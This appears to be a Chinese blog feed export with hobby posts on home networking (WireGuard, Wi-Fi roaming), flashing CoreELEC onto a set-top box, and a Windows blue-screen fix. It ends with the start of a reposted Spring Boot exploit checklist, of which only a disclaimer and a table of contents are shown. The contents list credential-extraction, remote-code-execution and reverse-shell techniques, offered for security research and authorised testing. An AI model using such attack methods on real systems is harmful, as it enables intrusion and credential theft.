<p>配置组播代理，把<code>wan_iptv</code>接口的组播流量转发到<code>lan</code>口，下面图从其它地方截的所以没有<code>wan_iptv</code>，下次有机会再换回来。<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-03-15-16-01-34.png"></p>
<p>配置完成，保存，重启机顶盒查看能否成功登陆并播放电视节目，如果不能，可通过在openwrt上面抓包查看有哪些流量异常再进行排错。</p>
<h3 id="WIFI漫游"><a href="#WIFI漫游" class="headerlink" title="WIFI漫游"></a>WIFI漫游</h3><p>WIFI漫游最简单的方式是，把无线路由器都设置为AP模式（主路由不需要配置AP模式；如果没有AP模式可关闭DHCP并把主路由LAN接入到无线路由器的LAN口），然后配置相同的<code>SSID</code>、加密方式、密码。效果还行，比AC+AP效果稍差，胜在配置简单，无需额外成本，家用足矣。</p>
<p>配置AP模式：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-13-28-28.png"><br>建议固定选<code>WPA2</code>+<code>AES</code>组合，如果不指定可能影响漫游效果：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-13-30-38.png"></p>
<p>另一个无线路由器也进行相同配置，不再一一截图。</p>
<p>完成后可进行漫游测试，使用移动设备连接WiFi长ping网关，移动不同位置可看到信号切换。如需调试可使用<code>WinFi</code>进行测试，不多赘述。</p>
<h3 id="异地组网"><a href="#异地组网" class="headerlink" title="异地组网"></a>异地组网</h3><p>由于移动申请ipv4公网ip很难，默认宽带也有ipv6地址，可通过ipv6进行异地组网。</p>
<p>首先需要获取ipv6地址，因为光猫桥接模式下wan6并未能获取到ipv6地址，故切换<code>wan6</code>接口的协议为<code>不配置协议</code>：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-14-41-42.png"><br>然后在WAN口打开ipv6设置：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-14-44-39.png"></p>
<p>保存后可在<code>LAN</code>口看到公网ipv6地址：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-14-48-20.png"></p>
<p>此时已经可以正常访问ipv6，接下来搭建WireGuard。我们再看一眼网络拓扑，目标是通过WireGuard架设隧道，让<code>192.168.100.0/24</code>与<code>192.168.200.0/24</code>可互访。<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-15-05-23.png"></p>
<p>首先在地域B的192.168.200.2上架设WireGuard服务，具体搭建步骤可搜索教程，非常简单，关键配置如下：<br>192.168.11.0/24网段用于VPN服务器之间的内网通信，59120是服务监听端口，切记需在防火墙放通（如有）。<br>同时需在Peer声明对端LAN网络子网，这样才允许WireGuard转发数据包到对端网络。<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-15-12-27.png"></p>
<p>然后是地域A配置：<br>接口ip地址写上地域B中配置的Peer地址，允许的IP写上地域B中的内网子网段<code>192.168.200.0/24</code>，必须勾上路由允许的IP，端点主机写地域B的WireGuard服务器的ipv6地址或域名（推荐进行DDNS，ipv6地址会定期变）<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-15-19-38.png"><br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-15-23-29.png"><br>防火墙区域设置为LAN：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-15-23-46.png"></p>
<p>接下来新建一个防火墙规则<code>wg_lan</code>，允许两个地域内网间的流量转发：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-15-25-13.png"></p>
<p>最后在地域B的网关即爱快路由器上配置一条静态路由，把地域A的内网段<code>192.168.100.0/24</code>的网关指向WireGuard服务器，即可让两地内网地址直连。<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-15-27-23.png"></p>
<p><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-15-30-11.png"></p>
<h3 id="NPS"><a href="#NPS" class="headerlink" title="NPS"></a>NPS</h3><p>nps配置比较简单，在公网的服务器启动nps服务端后，在openwrt上配置nps的连接信息即可，主要用于备用连接，防止ipv6网络连接失败导致连接不上内网。<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-15-31-01.png"></p>
<h3 id="阿里云WEBDAV"><a href="#阿里云WEBDAV" class="headerlink" title="阿里云WEBDAV"></a>阿里云WEBDAV</h3><p>阿里云WebDav非常推荐使用，在openwrt启动后内网设备可通过webdav协议打开网盘里的高清电影、音频等多媒体文件，配合电视或智能盒子安装Kodi播放，即可体检无广告、在线播放、高清电影，只要找到阿里云资源保存一份到自己网盘即可播放，非常方便。<br>只需要登录网盘网页版获取token填入，然后设置监听的端口及密码即可：<br><img data-src="/2023/01/25/%E8%AE%B0%E5%AE%B6%E5%BA%AD%E7%BD%91%E7%BB%9C%E7%BB%84%E7%BD%91/2023-02-07-15-32-51.png"></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文记录了一次家庭网络的折腾过程，希望能帮到有需求的有缘人。</p>
]]></content>
      <categories>
        <category>折腾</category>
      </categories>
      <tags>
        <tag>折腾</tag>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>魔白盒M411A刷CoreELEC</title>
    <url>/2023/05/21/%E9%AD%94%E7%99%BD%E7%9B%92M411A%E5%88%B7CoreELEC/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文记录一下魔白盒M411A刷入CoreELEC过程，因为这个型号的CoreELEC刷入教程少之又少，而且官方CoreELEC包是识别不了WiFi的，经过摸索后解决了这个问题，所以记录一下。</p>
<h3 id="硬件介绍"><a href="#硬件介绍" class="headerlink" title="硬件介绍"></a>硬件介绍</h3><p>首先博主手上的魔白盒M411A是黑龙江版本，PDD 49块包邮，性能比肩100多的N1，缺点是百兆网口，但是我刷CoreELEC使用WiFi倒是不影响，性价比极高。<br>前排提醒：该盒子版本众多，就算是同一型号也会有不同的硬件的情况，购买需谨慎。</p>
<table>
<thead>
<tr>
<th>CPU</th>
<th>S905L3A</th>
</tr>
</thead>
<tbody><tr>
<td>内存</td>
<td>2GB + 8GB</td>
</tr>
<tr>
<td>WIFI</td>
<td>双频WiFi （UWE5621DS）</td>
</tr>
<tr>
<td>蓝牙</td>
<td>有</td>
</tr>
<tr>
<td>网口</td>
<td>100M</td>
</tr>
<tr>
<td>USB</td>
<td>USB 2.0 * 2</td>
</tr>
</tbody></table>
<p>板子如下：<br><img data-src="/2023/05/21/%E9%AD%94%E7%99%BD%E7%9B%92M411A%E5%88%B7CoreELEC/2023-05-21-21-42-29.png"></p>
<a id="more"></a>
<h3 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h3><p>翻了很多教程，刷入官方CoreELEC以及armbian发现都无法驱动WiFi，拆机研究发现WiFi模块为<code>UWE5621DS</code>，然后搜索相关问题发现GitHub上有个支持该WiFi模块的CoreELEC固件，是为<code>e900v22c</code>适配的，该盒子与M411A硬件大致相同，遂尝试刷入，发现完美适配，WiFi、蓝牙等都正常。</p>
<p>固件地址：<br><a href="https://github.com/KryptonLee/e900v22c-CoreELEC.git">https://github.com/KryptonLee/e900v22c-CoreELEC.git</a></p>
<h3 id="制作最新固件"><a href="#制作最新固件" class="headerlink" title="制作最新固件"></a>制作最新固件</h3><p>在测试使用正常后，发现美中不足是作者提供的版本不是最新的，最新的发行版本是<code>20.1-Nexus</code>。<br><img data-src="/2023/05/21/%E9%AD%94%E7%99%BD%E7%9B%92M411A%E5%88%B7CoreELEC/2023-05-21-21-54-16.png"></p>
<p>查看作者源码，作者已提供了构建脚本，只需要修改脚本的版本号即可自行选择版本。</p>
<p>安装构建所需工具，然后git下载代码仓库：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update -y</span><br><span class="line">sudo apt-get install -y make gcc git texinfo gzip squashfs-tools</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/KryptonLee/e900v22c-CoreELEC.git</span><br><span class="line"><span class="built_in">cd</span> e900v22c-CoreELE</span><br></pre></td></tr></table></figure>

<p>修改<code>build.sh</code>：<br><img data-src="/2023/05/21/%E9%AD%94%E7%99%BD%E7%9B%92M411A%E5%88%B7CoreELEC/2023-05-21-21-57-56.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">version=<span class="string">&quot;20.1-Nexus&quot;</span></span><br></pre></td></tr></table></figure>

<p>具体版本编号可以看CoreELEC官方GitHub：<br><img data-src="/2023/05/21/%E9%AD%94%E7%99%BD%E7%9B%92M411A%E5%88%B7CoreELEC/2023-05-21-21-59-58.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./build</span><br></pre></td></tr></table></figure>
<p>开始构建：<br><img data-src="/2023/05/21/%E9%AD%94%E7%99%BD%E7%9B%92M411A%E5%88%B7CoreELEC/2023-05-21-22-01-00.png"></p>
<p>构建成功后生成img.gz文件，解压后就是我们的固件包：<br><img data-src="/2023/05/21/%E9%AD%94%E7%99%BD%E7%9B%92M411A%E5%88%B7CoreELEC/2023-05-21-22-01-19.png"></p>
<p>下面是我做好的固件包：<br><a href="https://github.com/ryanInf/ryaninf.github.io/releases/download/m411a/CoreELEC-Amlogic-ng.arm-20.1-Nexus-m411a-2023.05.18.img.gz">M411A-CoreELEC固件</a></p>
<h3 id="刷入CoreELEC"><a href="#刷入CoreELEC" class="headerlink" title="刷入CoreELEC"></a>刷入CoreELEC</h3><p>前排提醒：刷机有风险，建议先备份固件。同时请确认自己具备救砖能力再考虑刷入，博主也曾翻车后面靠线刷救回。</p>
<p>使用烧录工具写入U盘：<br><img data-src="/2023/05/21/%E9%AD%94%E7%99%BD%E7%9B%92M411A%E5%88%B7CoreELEC/2023-05-21-22-02-03.png"></p>
<p>然后从让盒子从U盘启动，这里因为每个盒子的方法都可能不一样，这里说下我的方法：<br>在盒子原本的安卓系统中开启adb调试，<strong>U盘插入到靠近网口的那个USB口</strong>，然后连接adb执行下面命令，重启后盒子会进入U盘的系统：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb shell reboot update</span><br></pre></td></tr></table></figure>

<p>默认界面是英文的，我改为中文了：<br><img data-src="/2023/05/21/%E9%AD%94%E7%99%BD%E7%9B%92M411A%E5%88%B7CoreELEC/2023-05-21-22-11-21.png"></p>
<p><img data-src="/2023/05/21/%E9%AD%94%E7%99%BD%E7%9B%92M411A%E5%88%B7CoreELEC/2023-05-21-22-12-06.png"></p>
<p>WiFi、蓝牙正常：<br><img data-src="/2023/05/21/%E9%AD%94%E7%99%BD%E7%9B%92M411A%E5%88%B7CoreELEC/2023-05-21-22-13-27.png"><br><img data-src="/2023/05/21/%E9%AD%94%E7%99%BD%E7%9B%92M411A%E5%88%B7CoreELEC/2023-05-21-22-14-00.png"></p>
<h3 id="刷入EMMC"><a href="#刷入EMMC" class="headerlink" title="刷入EMMC"></a>刷入EMMC</h3><p>这是一个可选步骤，如果不想一直从U盘启动，可写入EMMC就能本地启动了。<br><strong>在刷入前请确保各功能都正常使用，同时也接受变砖的风险。</strong><br>首先打开CoreELEC的SSH并连接：<br><img data-src="/2023/05/21/%E9%AD%94%E7%99%BD%E7%9B%92M411A%E5%88%B7CoreELEC/2023-05-21-22-02-37.png"></p>
<p>执行刷入命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ceemmc -x</span><br></pre></td></tr></table></figure>
<p><img data-src="/2023/05/21/%E9%AD%94%E7%99%BD%E7%9B%92M411A%E5%88%B7CoreELEC/2023-05-21-22-17-45.png"><br><img data-src="/2023/05/21/%E9%AD%94%E7%99%BD%E7%9B%92M411A%E5%88%B7CoreELEC/2023-05-21-22-17-53.png"></p>
<p>刷入成功，重启即可拔U盘正常启动。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://github.com/KryptonLee/e900v22c-CoreELEC">https://github.com/KryptonLee/e900v22c-CoreELEC</a></p>
]]></content>
      <categories>
        <category>折腾</category>
      </categories>
      <tags>
        <tag>折腾</tag>
      </tags>
  </entry>
  <entry>
    <title>记解决烦人的Windows蓝屏</title>
    <url>/2023/05/17/%E8%AE%B0%E8%A7%A3%E5%86%B3%E7%83%A6%E4%BA%BA%E7%9A%84Windows%E8%93%9D%E5%B1%8F/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Windows 又双叒叕蓝屏了，这次是<code>DPC WATCHDOG VIOLATION</code>蓝屏，记录下解决过程。<br><img data-src="/2023/05/17/%E8%AE%B0%E8%A7%A3%E5%86%B3%E7%83%A6%E4%BA%BA%E7%9A%84Windows%E8%93%9D%E5%B1%8F/2023-05-17-11-46-05.png"></p>
<a id="more"></a>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先安装windows官方的工具<a href="https://www.microsoft.com/zh-cn/p/windbg/9pgjgd53tn86?rtc=1&activetab=pivot:overviewtab">WinDbg Preview</a>。</p>
<p>然后以管理员身份运行该工具，选择打开文件，打开<code>C:\Windows\Minidump</code>目录下的文件，如果最近有蓝屏可以找到最近的<code>.dmp</code>文件，打开后会自动下载一些分析库。<br><img data-src="/2023/05/17/%E8%AE%B0%E8%A7%A3%E5%86%B3%E7%83%A6%E4%BA%BA%E7%9A%84Windows%E8%93%9D%E5%B1%8F/2023-05-17-11-47-50.png"></p>
<p>程序下方进度条加载完后，点击<code>!analyze -v</code>开始分析：<br><img data-src="/2023/05/17/%E8%AE%B0%E8%A7%A3%E5%86%B3%E7%83%A6%E4%BA%BA%E7%9A%84Windows%E8%93%9D%E5%B1%8F/2023-05-17-11-49-17.png"></p>
<p>最终定位到是<code>GlassWire</code>这个软件引起的，卸载，收工。<br><img data-src="/2023/05/17/%E8%AE%B0%E8%A7%A3%E5%86%B3%E7%83%A6%E4%BA%BA%E7%9A%84Windows%E8%93%9D%E5%B1%8F/2023-05-17-11-50-14.png"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://zhuanlan.zhihu.com/p/268642207?utm_id=0">https://zhuanlan.zhihu.com/p/268642207?utm_id=0</a></p>
]]></content>
      <categories>
        <category>折腾</category>
      </categories>
      <tags>
        <tag>折腾</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring Boot Vulnerability Exploit Check List</title>
    <url>/2021/04/29/Spring-Boot-Vulnerability-Exploit-Check-List/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文转载自<a href="https://github.com/LandGrey/SpringBootVulExploit">LandGrey/SpringBootVulExploit</a>，在此膜拜大佬。</p>
<hr>
<h1 id="Spring-Boot-Vulnerability-Exploit-Check-List"><a href="#Spring-Boot-Vulnerability-Exploit-Check-List" class="headerlink" title="Spring Boot Vulnerability Exploit Check List"></a>Spring Boot Vulnerability Exploit Check List</h1><p>Spring Boot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list</p>
<a id="more"></a>

<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><blockquote>
<p><strong>⚠️ 本项目所有内容仅作为安全研究和授权测试使用, 相关人员对因误用和滥用该项目造成的一切损害概不负责</strong></p>
</blockquote>
<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
<li><a href="#spring-boot-vulnerability-exploit-check-list">Spring Boot Vulnerability Exploit Check List</a><ul>
<li><a href="#%E5%A3%B0%E6%98%8E">声明</a></li>
<li><a href="#%E7%9B%AE%E5%BD%95">目录</a></li>
<li><a href="#%E9%9B%B6%E8%B7%AF%E7%94%B1%E5%92%8C%E7%89%88%E6%9C%AC">零：路由和版本</a><ul>
<li><a href="#0x01%E8%B7%AF%E7%94%B1%E7%9F%A5%E8%AF%86">0x01：路由知识</a></li>
<li><a href="#0x02%E7%89%88%E6%9C%AC%E7%9F%A5%E8%AF%86">0x02：版本知识</a><ul>
<li><a href="#%E7%BB%84%E4%BB%B6%E7%89%88%E6%9C%AC%E7%9A%84%E7%9B%B8%E4%BA%92%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB">组件版本的相互依赖关系：</a></li>
<li><a href="#spring-cloud-%E4%B8%8E-spring-boot-%E7%89%88%E6%9C%AC%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB">Spring Cloud 与 Spring Boot 版本之间的依赖关系：</a></li>
<li><a href="#spring-cloud-%E5%B0%8F%E7%89%88%E6%9C%AC%E5%8F%B7%E7%9A%84%E5%90%8E%E7%BC%80%E5%8F%8A%E5%90%AB%E4%B9%89">Spring Cloud 小版本号的后缀及含义:</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E4%B8%80%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">一：信息泄露</a><ul>
<li><a href="#0x01%E8%B7%AF%E7%94%B1%E5%9C%B0%E5%9D%80%E5%8F%8A%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E8%AF%A6%E6%83%85%E6%B3%84%E6%BC%8F">0x01：路由地址及接口调用详情泄漏</a></li>
<li><a href="#0x02%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E8%80%8C%E6%9A%B4%E9%9C%B2%E7%9A%84%E8%B7%AF%E7%94%B1">0x02：配置不当而暴露的路由</a></li>
<li><a href="#0x03%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%B8%80">0x03：获取被星号脱敏的密码的明文 (方法一)</a><ul>
<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6">利用条件：</a></li>
<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95">利用方法：</a><ul>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D">步骤一： 找到想要获取的属性名</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C-jolokia-%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3-mbean-%E8%8E%B7%E5%8F%96%E6%98%8E%E6%96%87">步骤二： jolokia 调用相关 Mbean 获取明文</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#0x04%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%BA%8C">0x04：获取被星号脱敏的密码的明文 (方法二)</a><ul>
<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1">利用条件：</a></li>
<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-1">利用方法：</a><ul>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-1">步骤一： 找到想要获取的属性名</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E4%BD%BF%E7%94%A8-nc-%E7%9B%91%E5%90%AC-http-%E8%AF%B7%E6%B1%82">步骤二： 使用 nc 监听 HTTP 请求</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E8%AE%BE%E7%BD%AE-eurekaclientserviceurldefaultzone-%E5%B1%9E%E6%80%A7">步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B-%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE">步骤四： 刷新配置</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%94-%E8%A7%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%80%BC">步骤五： 解码属性值</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#0x05%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%B8%89">0x05：获取被星号脱敏的密码的明文 (方法三)</a><ul>
<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-2">利用条件：</a></li>
<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-2">利用方法：</a><ul>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-2">步骤一： 找到想要获取的属性名</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E4%BD%BF%E7%94%A8-nc-%E7%9B%91%E5%90%AC-http-%E8%AF%B7%E6%B1%82-1">步骤二： 使用 nc 监听 HTTP 请求</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E8%A7%A6%E5%8F%91%E5%AF%B9%E5%A4%96-http-%E8%AF%B7%E6%B1%82">步骤三： 触发对外 http 请求</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B-%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE-1">步骤四： 刷新配置</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#0x06%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E5%9B%9B">0x06：获取被星号脱敏的密码的明文 (方法四)</a><ul>
<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-3">利用条件：</a></li>
<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-3">利用方法：</a><ul>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-3">步骤一： 找到想要获取的属性名</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E4%B8%8B%E8%BD%BD-jvm-heap-%E4%BF%A1%E6%81%AF">步骤二： 下载 jvm heap 信息</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E4%BD%BF%E7%94%A8-mat-%E8%8E%B7%E5%BE%97-jvm-heap-%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81%E6%98%8E%E6%96%87">步骤三： 使用 MAT 获得 jvm heap 中的密码明文</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E4%BA%8C%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">二：远程代码执行</a><ul>
<li><a href="#0x01whitelabel-error-page-spel-rce">0x01：whitelabel error page SpEL RCE</a><ul>
<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-4">利用条件：</a></li>
<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-4">利用方法：</a><ul>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%BE%E5%88%B0%E4%B8%80%E4%B8%AA%E6%AD%A3%E5%B8%B8%E4%BC%A0%E5%8F%82%E5%A4%84">步骤一：找到一个正常传参处</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E6%89%A7%E8%A1%8C-spel-%E8%A1%A8%E8%BE%BE%E5%BC%8F">步骤二：执行 SpEL 表达式</a></li>
</ul>
</li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">漏洞原理：</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析：</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83">漏洞环境：</a></li>
</ul>
</li>
<li><a href="#0x02spring-cloud-snakeyaml-rce">0x02：spring cloud SnakeYAML RCE</a><ul>
<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-5">利用条件：</a></li>
<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-5">利用方法：</a><ul>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%98%E7%AE%A1-yml-%E5%92%8C-jar-%E6%96%87%E4%BB%B6">步骤一： 托管 yml 和 jar 文件</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E8%AE%BE%E7%BD%AE-springcloudbootstraplocation-%E5%B1%9E%E6%80%A7">步骤二： 设置 spring.cloud.bootstrap.location 属性</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE">步骤三： 刷新配置</a></li>
</ul>
</li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1">漏洞原理：</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1">漏洞分析：</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-1">漏洞环境：</a></li>
</ul>
</li>
<li><a href="#0x03eureka-xstream-deserialization-rce">0x03：eureka xstream deserialization RCE</a><ul>
<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-6">利用条件：</a></li>
<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-6">利用方法：</a><ul>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9E%B6%E8%AE%BE%E5%93%8D%E5%BA%94%E6%81%B6%E6%84%8F-xstream-payload-%E7%9A%84%E7%BD%91%E7%AB%99">步骤一：架设响应恶意 XStream payload 的网站</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3">步骤二：监听反弹 shell 的端口</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E8%AE%BE%E7%BD%AE-eurekaclientserviceurldefaultzone-%E5%B1%9E%E6%80%A7">步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE">步骤四：刷新配置</a></li>
</ul>
</li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2">漏洞原理：</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2">漏洞分析：</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-2">漏洞环境：</a></li>
</ul>
</li>
<li><a href="#0x04jolokia-logback-jndi-rce">0x04：jolokia logback JNDI RCE</a><ul>
<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-7">利用条件：</a></li>
<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-7">利用方法：</a><ul>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9F%A5%E7%9C%8B%E5%B7%B2%E5%AD%98%E5%9C%A8%E7%9A%84-mbeans">步骤一：查看已存在的 MBeans</a></li>
<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E6%89%98%E7%AE%A1-xml-%E6%96%87%E4%BB%B6">步骤二：托管 xml 文件</a></li>
